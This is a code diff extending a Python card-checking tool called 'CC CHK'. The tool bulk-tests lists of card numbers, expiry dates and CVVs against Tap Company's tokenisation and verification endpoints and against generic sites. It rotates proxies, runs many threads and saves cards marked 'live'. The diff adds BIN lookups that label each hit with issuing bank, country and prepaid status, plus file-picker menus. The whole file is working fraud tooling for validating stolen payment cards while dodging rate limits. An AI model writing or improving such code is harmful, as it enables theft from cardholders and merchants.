@@ -14,7 +14,6 @@ import itertools
 from concurrent.futures import ThreadPoolExecutor, as_completed
 from datetime import datetime
 from typing import Any
-from urllib.parse import urlparse
 
 try:
     sys.stdout.reconfigure(encoding="utf-8")
@@ -33,6 +32,9 @@ from colorama import Fore, Style, init
 from cfonts import render
 
 init(autoreset=True)
+
+IS_TERMUX = ("com.termux" in os.environ.get("PREFIX", "")
+             or os.path.isdir("/data/data/com.termux"))
 
 # ---------- palette ----------
 WHITE   = Fore.LIGHTWHITE_EX + Style.BRIGHT
@@ -60,6 +62,10 @@ CC_HEADERS = {
     "X-Requested-With": "XMLHttpRequest",
 }
 
+BIN_API = "https://lookup.binlist.net/"
+BIN_HEADERS = {"Accept-Version": "3",
+               "User-Agent": "Mozilla/5.0 (Linux; Android 15)"}
+
 TAP_TOKEN_URL  = "https://api.tap.company/v2/tokens/"
 TAP_VERIFY_URL = "https://api.tap.company/v2/card/verify/"
 
@@ -77,10 +83,8 @@ STATUS_COLOR = {
 # =========================================================
 
 _PW_B64 = [
-    "c2Fla2E=",
-    "c2Fla2FjdXRpZQ==",
-    "Y2hr",
-    "c2Fla2FjaGVja2Vy",
+    "c2Fla2E=", "c2Fla2FjdXRpZQ==",
+    "Y2hr", "c2Fla2FjaGVja2Vy",
 ]
 
 def _hash(s: str) -> str:
@@ -189,17 +193,74 @@ def boxed(lines: list[str], width: int = 64, color: str = CYAN) -> None:
 def banner() -> None:
     clear()
     try:
-        art = render("CC CHK", colors=["candy"], align="center")
+        art = render("CC CHK", font="tiny", colors=["candy"], align="left")
     except Exception:
-        art = "\n    C C   C H K\n"
-    w = 68
+        art = "CC CHK\n"
+    w = 64
     print(CYAN + "═" * w)
     print(art, end="")
     print(CYAN + "═" * w)
-    print(WHITE + "kramyer  |  Raiii Kramyer".center(w))
-    print(DIM + "single · bulk · replay · proxy · address · drivers".center(w))
+    print(WHITE + "kramyer  |  Raiii Kramyer")
+    print(DIM + "single · bulk · replay · proxy · address · drivers")
     print(CYAN + "═" * w)
     print()
+
+# =========================================================
+#  BIN LOOKUP (binlist.net)
+# =========================================================
+
+_BIN_CACHE: dict[str, dict] = {}
+_BIN_LOCK = threading.Lock()
+
+def flag_emoji(alpha2: str) -> str:
+    if not alpha2 or len(alpha2) != 2:
+        return ""
+    try:
+        return "".join(chr(0x1F1E6 + ord(c) - ord("A")) for c in alpha2.upper())
+    except Exception:
+        return ""
+
+def lookup_bin(bin_number: str, pool: "ProxyPool | None" = None) -> dict:
+    """Fetch BIN metadata from binlist.net. Cached per 6-digit BIN."""
+    with _BIN_LOCK:
+        if bin_number in _BIN_CACHE:
+            return _BIN_CACHE[bin_number]
+
+    result: dict = {}
+    proxy = pool.next() if pool else None
+    try:
+        r = requests.get(BIN_API + bin_number, headers=BIN_HEADERS,
+                         timeout=10, proxies=proxy_dict(proxy))
+        if r.status_code == 200:
+            data = r.json() or {}
+            country = data.get("country") or {}
+            bank = data.get("bank") or {}
+            alpha2 = country.get("alpha2") or ""
+            result = {
+                "scheme":       (data.get("scheme") or "").capitalize(),
+                "brand":        data.get("brand") or "",
+                "type":         (data.get("type") or "").capitalize(),
+                "prepaid":      bool(data.get("prepaid")),
+                "bank":         bank.get("name") or "",
+                "country":      country.get("name") or "",
+                "country_code": alpha2,
+                "country_emoji": country.get("emoji") or flag_emoji(alpha2),
+            }
+        elif r.status_code == 429:
+            result = {"error": "rate-limited"}
+        elif r.status_code == 404:
+            result = {"error": "bin-not-found"}
+        else:
+            result = {"error": f"http-{r.status_code}"}
+    except Exception as e:
+        result = {"error": str(e)[:80]}
+
+    with _BIN_LOCK:
+        _BIN_CACHE[bin_number] = result
+    return result
+
+def extract_bin(cc: str) -> str:
+    return cc.split("|")[0][:6]
 
 # =========================================================
 #  CONFIG
@@ -255,6 +316,135 @@ def ensure_storage() -> str:
             CFG["storage_folder"] = folder
             save_config(CFG)
     return folder
+
+# =========================================================
+#  PATH RESOLVER + FILE PICKER
+# =========================================================
+
+def resolve_user_path(raw: str) -> str | None:
+    raw = raw.strip().strip('"').strip("'")
+    if not raw:
+        return None
+    if raw.startswith("~"):
+        return os.path.expanduser(raw)
+    for prefix in ("storage/emulated/0/", "/storage/emulated/0/"):
+        if raw.startswith(prefix):
+            rest = raw[len(prefix):]
+            return os.path.expanduser("~/storage/shared/" + rest)
+    if os.path.isabs(raw):
+        return raw
+    return os.path.abspath(raw)
+
+def _default_start_dir() -> str:
+    candidates = [
+        os.path.expanduser("~/storage/shared"),
+        os.path.expanduser("~/storage/downloads"),
+        os.path.expanduser("~/storage"),
+        os.path.expanduser("~"),
+        os.getcwd(),
+    ]
+    for c in candidates:
+        if os.path.isdir(c):
+            return c
+    return os.getcwd()
+
+def pick_path(ext: str | None = None, start_dir: str | None = None,
+              want_dir: bool = False) -> str | None:
+    cur = start_dir or _default_start_dir()
+    while True:
+        banner()
+        print(CYAN + f"  dir  {WHITE}{cur}{R}")
+        if want_dir:
+            print(DIM + "  (dir mode — enter selects this folder)" + R)
+        print()
+        entries = []
+        parent = os.path.dirname(cur)
+        if parent and parent != cur:
+            entries.append(("..", parent, "up"))
+        try:
+            names = sorted(os.listdir(cur))
+        except Exception:
+            names = []
+        for n in names:
+            if n.startswith("."):
+                continue
+            p = os.path.join(cur, n)
+            try:
+                if os.path.isdir(p):
+                    entries.append((n + "/", p, "dir"))
+                elif ext is None or n.lower().endswith(ext.lower()):
+                    entries.append((n, p, "file"))
+            except Exception:
+                continue
+        if not entries:
+            print(DIM + "  (empty)" + R)
+        for i, (name, path, kind) in enumerate(entries, 1):
+            if kind in ("dir", "up"):
+                print(f"  {WHITE}[{i:>3}]{R}  {CYAN}{name}{R}")
+            else:
+                print(f"  {WHITE}[{i:>3}]{R}  {name}")
+        print()
+        hint = "q = cancel"
+        if want_dir:
+            hint = "enter = select this folder   ·   " + hint
+        print(DIM + f"  {hint}" + R)
+        c = input(YELLOW + "  # ▸ " + R).strip()
+        if c.lower() == "q":
+            return None
+        if c == "" and want_dir:
+            return cur
+        try:
+            i = int(c) - 1
+            if 0 <= i < len(entries):
+                _, path, kind = entries[i]
+                if kind in ("dir", "up"):
+                    cur = path
+                else:
+                    return path
+        except ValueError:
+            pass
+
+def choose_file(ext: str = ".txt", prompt_label: str = "file") -> str | None:
+    banner()
+    print("  " + CYAN + f"select {prompt_label}" + R)
+    print("  " + DIM + "[1] browse    [2] type path    [0] cancel" + R)
+    mode = input("  " + YELLOW + "▸ " + R).strip()
+    if mode == "0" or mode == "":
+        return None
+    if mode == "2":
+        raw = input("  " + CYAN + "path ▸ " + R)
+        p = resolve_user_path(raw)
+        if p and not os.path.isfile(p) and not os.path.splitext(p)[1]:
+            cand = p + ext
+            if os.path.isfile(cand):
+                p = cand
+        if not p or not os.path.isfile(p):
+            print("  " + RED + f"not found: {p or raw}" + R)
+            time.sleep(1.2)
+            return None
+        return p
+    return pick_path(ext=ext)
+
+def choose_dir(prompt_label: str = "folder") -> str | None:
+    banner()
+    print("  " + CYAN + f"select {prompt_label}" + R)
+    print("  " + DIM + "[1] browse    [2] type path    [0] cancel" + R)
+    mode = input("  " + YELLOW + "▸ " + R).strip()
+    if mode == "0" or mode == "":
+        return None
+    if mode == "2":
+        raw = input("  " + CYAN + "path ▸ " + R)
+        p = resolve_user_path(raw)
+        if not p:
+            return None
+        try:
+            os.makedirs(p, exist_ok=True)
+        except Exception as e:
+            print("  " + RED + str(e) + R)
+            time.sleep(1.2)
+            return None
+        return p
+    return pick_path(want_dir=True)
 
 # =========================================================
 #  PROXY POOL
@@ -354,8 +544,6 @@ def register_driver(name: str):
 def get_driver(name: str):
     return DRIVER_REGISTRY.get(name.lower())
 
-# ---------- Tap Company ----------
-
 @register_driver("tap")
 class TapDriver:
     name = "tap"
@@ -377,21 +565,6 @@ class TapDriver:
         p = self.pool.next()
         return proxy_dict(p) if p else None
 
-    def _create_token(self, num, mm, yy, cvv) -> str | None:
-        addr = CFG.get("address", {})
-        body = {"card": {
-            "number": num, "exp_month": mm, "exp_year": yy, "cvc": cvv,
-            "name": f"{addr.get('first_name','')} {addr.get('last_name','')}".strip(),
-        }}
-        try:
-            r = self.session.post(TAP_TOKEN_URL, json=body,
-                                  timeout=20, proxies=self._proxy())
-            if r.status_code in (200, 201):
-                return r.json().get("id")
-        except Exception:
-            pass
-        return None
-
     def test(self, cc: str) -> dict:
         t0 = time.time()
         parts = cc.split("|")
@@ -403,28 +576,29 @@ class TapDriver:
         if not self.api_key:
             return {"status": "error", "message": "no Tap API key",
                     "elapsed": round(time.time() - t0, 2)}
-
-        token = self._create_token(num, mm, yy, cvv)
-        if not token:
-            return {"status": "error", "message": "token creation failed",
-                    "elapsed": round(time.time() - t0, 2)}
-
         addr = CFG.get("address", {})
-        body = {
-            "currency": "KWD",
-            "threeDSecure": True,
-            "save_card": False,
-            "customer": {
-                "first_name": addr.get("first_name") or "Test",
-                "last_name": addr.get("last_name") or "User",
-                "email": addr.get("email") or "test@test.com",
-                "phone": {"country_code": "965", "number": "50000000"},
-            },
-            "source": {"object": "token", "id": token},
-        }
         try:
-            r = self.session.post(TAP_VERIFY_URL, json=body,
-                                  timeout=20, proxies=self._proxy())
+            tr = self.session.post(TAP_TOKEN_URL, json={"card": {
+                "number": num, "exp_month": mm, "exp_year": yy, "cvc": cvv,
+                "name": f"{addr.get('first_name','')} {addr.get('last_name','')}".strip(),
+            }}, timeout=20, proxies=self._proxy())
+            if tr.status_code not in (200, 201):
+                return {"status": "error", "message": "token failed",
+                        "elapsed": round(time.time() - t0, 2)}
+            token = tr.json().get("id")
+            if not token:
+                return {"status": "error", "message": "no token id",
+                        "elapsed": round(time.time() - t0, 2)}
+            r = self.session.post(TAP_VERIFY_URL, json={
+                "currency": "KWD", "threeDSecure": True, "save_card": False,
+                "customer": {
+                    "first_name": addr.get("first_name") or "Test",
+                    "last_name": addr.get("last_name") or "User",
+                    "email": addr.get("email") or "test@test.com",
+                    "phone": {"country_code": "965", "number": "50000000"},
+                },
+                "source": {"object": "token", "id": token},
+            }, timeout=20, proxies=self._proxy())
             data = r.json()
         except Exception as e:
             return {"status": "error", "message": str(e),
@@ -437,13 +611,11 @@ class TapDriver:
             return {"status": status, "message": msg or status,
                     "code": str(r.status_code), "elapsed": elapsed}
         if status == "initiated":
-            url = data.get("transaction", {}).get("url", "")
             return {"status": "initiated", "message": "3DS required",
-                    "url": url, "code": str(r.status_code), "elapsed": elapsed}
+                    "url": data.get("transaction", {}).get("url", ""),
+                    "code": str(r.status_code), "elapsed": elapsed}
         return {"status": "unknown", "message": msg or f"HTTP {r.status_code}",
                 "code": str(r.status_code), "elapsed": elapsed}
-
-# ---------- Generic ----------
 
 @register_driver("generic")
 class GenericDriver:
@@ -491,7 +663,6 @@ class GenericDriver:
         except Exception as e:
             return {"status": "error", "message": str(e),
                     "elapsed": round(time.time() - t0, 2)}
-
         elapsed = round(time.time() - t0, 2)
         text = r.text[:400].lower()
         if r.status_code in (200, 201) and any(k in text for k in
@@ -503,8 +674,6 @@ class GenericDriver:
                     "code": str(r.status_code), "elapsed": elapsed}
         return {"status": "unknown", "message": f"HTTP {r.status_code}",
                 "code": str(r.status_code), "elapsed": elapsed}
-
-# ---------- auto-detect ----------
 
 def detect_driver_name(site: str) -> str:
     s = site.lower()
@@ -543,12 +712,19 @@ class Storage:
             with open(p, "a", encoding="utf-8") as f:
                 f.write(f"# run {datetime.now().isoformat(timespec='seconds')}\n")
 
-    def write(self, cc: str, api_res: dict, co_res: dict | None = None) -> None:
+    def write(self, cc: str, api_res: dict,
+              bin_res: dict | None = None,
+              co_res: dict | None = None) -> None:
         with self._lock:
             with open(self.hits_path, "a", encoding="utf-8") as f:
                 f.write(cc + "\n")
-            line = (f"{cc}\t{api_res.get('status')}\t"
-                    f"{api_res.get('network','')}\t{api_res.get('color','')}\n")
+            b = bin_res or {}
+            line = (f"{cc}\t{api_res.get('status','')}\t"
+                    f"{api_res.get('network','')}\t{api_res.get('color','')}\t"
+                    f"{b.get('scheme','')}\t{b.get('bank','')}\t"
+                    f"{b.get('country','')}\t{b.get('country_code','')}\t"
+                    f"{b.get('type','')}\t{int(bool(b.get('prepaid')))}"
+                    f"\n")
             with open(self.full_path, "a", encoding="utf-8") as f:
                 f.write(line)
             if co_res:
@@ -559,7 +735,23 @@ class Storage:
 #  RENDER
 # =========================================================
 
-def render_block(cc: str, api_res: dict, co_res: dict | None = None) -> None:
+def _bin_bits(b: dict) -> str:
+    if not b or b.get("error"):
+        return ""
+    parts = []
+    if b.get("bank"):      parts.append(b["bank"])
+    cc_ = b.get("country_code") or ""
+    if cc_:
+        parts.append(f"{cc_} {b.get('country_emoji','')}".strip())
+    elif b.get("country"):
+        parts.append(b["country"])
+    if b.get("type"):      parts.append(b["type"])
+    if b.get("prepaid"):   parts.append("Prepaid")
+    return "  ·  ".join(parts)
+
+def render_block(cc: str, api_res: dict,
+                 bin_res: dict | None = None,
+                 co_res: dict | None = None) -> None:
     api_status = str(api_res.get("status", "unknown")).lower()
     api_color = STATUS_COLOR.get(api_status, YELLOW)
 
@@ -573,9 +765,28 @@ def render_block(cc: str, api_res: dict, co_res: dict | None = None) -> None:
         v = api_res.get(key)
         if v:
             print(f"  {label:<10}: {WHITE}{v}{R}")
+
+    if bin_res and not bin_res.get("error"):
+        print(f"  {'BIN':<10}: {WHITE}{extract_bin(cc)}{R}")
+        if bin_res.get("scheme"):
+            print(f"  {'Scheme':<10}: {WHITE}{bin_res['scheme']}{R}")
+        if bin_res.get("type"):
+            print(f"  {'Type':<10}: {WHITE}{bin_res['type']}{R}")
+        if bin_res.get("bank"):
+            print(f"  {'Bank':<10}: {GREEN}{bin_res['bank']}{R}")
+        if bin_res.get("country"):
+            cc_ = bin_res.get("country_code") or ""
+            emoji = bin_res.get("country_emoji") or ""
+            print(f"  {'Country':<10}: {WHITE}{bin_res['country']}"
+                  + (f" ({cc_})" if cc_ else "")
+                  + (f"  {emoji}" if emoji else "") + R)
+        if bin_res.get("prepaid"):
+            print(f"  {'Prepaid':<10}: {YELLOW}yes{R}")
+
     if api_res.get("msg"):
         clean = TAG_RE.sub("", str(api_res["msg"])).strip()
         print(f"  {'Detail':<10}: {DIM}{clean}{R}")
+
     if co_res:
         cs = co_res.get("status", "unknown").lower()
         col = STATUS_COLOR.get(cs, YELLOW)
@@ -591,15 +802,21 @@ def render_block(cc: str, api_res: dict, co_res: dict | None = None) -> None:
     print(CYAN + "═" * 62)
     print()
 
-def render_compact(cc: str, api_res: dict, co_res: dict | None = None) -> None:
+def render_compact(cc: str, api_res: dict,
+                   bin_res: dict | None = None,
+                   co_res: dict | None = None) -> None:
     st = str(api_res.get("status", "unknown")).lower()
     col = STATUS_COLOR.get(st, YELLOW)
     tag = f"{col}{st.upper():<5}{R}"
-    extra = ""
-    if st == "live":
-        bits = [str(b) for b in (api_res.get("network"), api_res.get("color")) if b]
-        if bits:
-            extra = DIM + "  " + " / ".join(bits) + R
+
+    extras = []
+    if api_res.get("network"):
+        extras.append(str(api_res["network"]))
+    b_bits = _bin_bits(bin_res or {})
+    if b_bits:
+        extras.append(b_bits)
+    extra = ("  " + DIM + "  ·  ".join(extras) + R) if extras else ""
+
     co = ""
     if co_res:
         cs = co_res.get("status", "unknown").lower()
@@ -629,8 +846,11 @@ def run_single() -> None:
             print("  " + RED + "bad format — card|mm|yy|cvv")
             continue
 
+        bin_no = extract_bin(cc)
         with Spinner("api check"):
             api_res = api_check(cc, pool=pool)
+        with Spinner("bin lookup"):
+            bin_res = lookup_bin(bin_no, pool=pool)
 
         co_res = None
         if driver and api_res.get("status") == "live":
@@ -640,9 +860,9 @@ def run_single() -> None:
                 except Exception as e:
                     co_res = {"status": "error", "message": str(e)}
 
-        render_block(cc, api_res, co_res)
+        render_block(cc, api_res, bin_res, co_res)
         if api_res.get("status") == "live":
-            Storage(ensure_storage()).write(cc, api_res, co_res)
+            Storage(ensure_storage()).write(cc, api_res, bin_res, co_res)
 
         if input("  " + YELLOW + "another? (y/n) ▸ " + R).strip().lower() != "y":
             break
@@ -659,14 +879,8 @@ def run_bulk() -> None:
         print("  " + DIM + f"driver: {type(driver).__name__ if driver else 'none'}"
               f"  target: {site}" + R)
 
-    raw = input("  " + CYAN + "input .txt path ▸ " + R).strip().strip('"').strip("'")
-    if not raw:
-        return
-    if not os.path.splitext(raw)[1]:
-        raw += ".txt"
-    src = os.path.abspath(raw)
-    if not os.path.isfile(src):
-        print("  " + RED + f"not found: {src}")
+    src = choose_file(ext=".txt", prompt_label="card list (.txt)")
+    if not src:
         return
 
     ccs_raw = []
@@ -701,13 +915,30 @@ def run_bulk() -> None:
             return
 
     print("  " + DIM + f"loaded {len(ccs)}  ·  dropped {dropped} dupes" + R)
+
+    # ---- OUTPUT FOLDER PICKER ----
+    banner()
+    default_folder = ensure_storage()
+    print()
+    print("  " + CYAN + "where to save hits?" + R)
+    boxed([
+        f"  {WHITE}[1]{R}  default  {DIM}{default_folder}{R}",
+        f"  {WHITE}[2]{R}  choose a folder",
+    ], width=62)
+    out_choice = input("  " + YELLOW + "▸ " + R).strip()
+    if out_choice == "2":
+        chosen = choose_dir("output folder for hits")
+        out_dir = chosen or default_folder
+    else:
+        out_dir = default_folder
+
     raw_w = input("  " + CYAN + "threads [8] ▸ " + R).strip()
     try:
         workers = max(1, min(64, int(raw_w))) if raw_w else 8
     except ValueError:
         workers = 8
 
-    store = Storage(ensure_storage())
+    store = Storage(out_dir)
     print()
     print(CYAN + "═" * 62)
     print(f"  {WHITE}BULK{R}  ·  {WHITE}{len(ccs)}{R} cards  ·  "
@@ -715,6 +946,7 @@ def run_bulk() -> None:
           + (f"  ·  {WHITE}{len(pool)}{R} proxies" if pool else "")
           + (f"  ·  driver: {WHITE}{type(driver).__name__}{R}" if driver else ""))
     print(f"  hits ▸ {DIM}{store.hits_path}{R}")
+    print(f"  full ▸ {DIM}{store.full_path}{R}")
     print(CYAN + "═" * 62)
     print()
 
@@ -726,13 +958,14 @@ def run_bulk() -> None:
 
     def worker(cc: str):
         api_res = api_check(cc, pool=pool)
+        bin_res = lookup_bin(extract_bin(cc), pool=pool)
         co_res = None
         if driver and api_res.get("status") == "live":
             try:
                 co_res = driver.test(cc)
             except Exception as e:
                 co_res = {"status": "error", "message": str(e)}
-        return cc, api_res, co_res
+        return cc, api_res, bin_res, co_res
 
     with open(ckpt, "a", encoding="utf-8") as ck_f:
         with ThreadPoolExecutor(max_workers=workers) as tp:
@@ -740,7 +973,7 @@ def run_bulk() -> None:
             done_n = 0
             status_line("  " + progress_bar(0, total))
             for fut in as_completed(futures):
-                cc, api_res, co_res = fut.result()
+                cc, api_res, bin_res, co_res = fut.result()
                 done_n += 1
                 st = str(api_res.get("status", "unknown")).lower()
                 if st not in counts:
@@ -752,12 +985,12 @@ def run_bulk() -> None:
                     co_counts[cs] = co_counts.get(cs, 0) + 1
 
                 clear_status()
-                render_compact(cc, api_res, co_res)
+                render_compact(cc, api_res, bin_res, co_res)
 
                 ck_f.write(f"{st}|{cc}\n")
                 ck_f.flush()
                 if st == "live":
-                    store.write(cc, api_res, co_res)
+                    store.write(cc, api_res, bin_res, co_res)
                     hits += 1
 
                 status_line("  " + progress_bar(done_n, total))
@@ -786,20 +1019,13 @@ def run_bulk() -> None:
 # =========================================================
 
 def run_replay() -> None:
-    raw = input("  " + CYAN + "hits .txt path ▸ " + R).strip().strip('"').strip("'")
-    if not raw:
-        return
-    if not os.path.splitext(raw)[1]:
-        raw += ".txt"
-    path = os.path.abspath(raw)
-    if not os.path.isfile(path):
-        print("  " + RED + f"not found: {path}")
+    path = choose_file(ext=".txt", prompt_label="hits file (.txt)")
+    if not path:
         return
 
     with open(path, "r", encoding="utf-8", errors="ignore") as f:
         ccs = [ln.strip() for ln in f
                if ln.strip() and not ln.strip().startswith("#")]
-
     if not ccs:
         print("  " + RED + "no cards in file")
         return
@@ -881,15 +1107,8 @@ def proxy_menu() -> None:
                 time.sleep(0.6)
 
         elif c == "2":
-            raw = input("  " + CYAN + "proxy .txt path ▸ " + R).strip().strip('"')
-            if not raw:
-                continue
-            if not os.path.splitext(raw)[1]:
-                raw += ".txt"
-            p = os.path.abspath(raw)
-            if not os.path.isfile(p):
-                print("  " + RED + "not found")
-                time.sleep(1)
+            p = choose_file(ext=".txt", prompt_label="proxy list (.txt)")
+            if not p:
                 continue
             n = 0
             with open(p, "r", encoding="utf-8", errors="ignore") as f:
@@ -956,9 +1175,8 @@ def settings_menu() -> None:
         c = input("  " + YELLOW + "select ▸ " + R).strip()
 
         if c == "1":
-            p = input("  " + CYAN + "folder path ▸ " + R).strip().strip('"')
+            p = choose_dir("storage folder")
             if p:
-                p = os.path.abspath(p)
                 try:
                     os.makedirs(p, exist_ok=True)
                     CFG["storage_folder"] = p
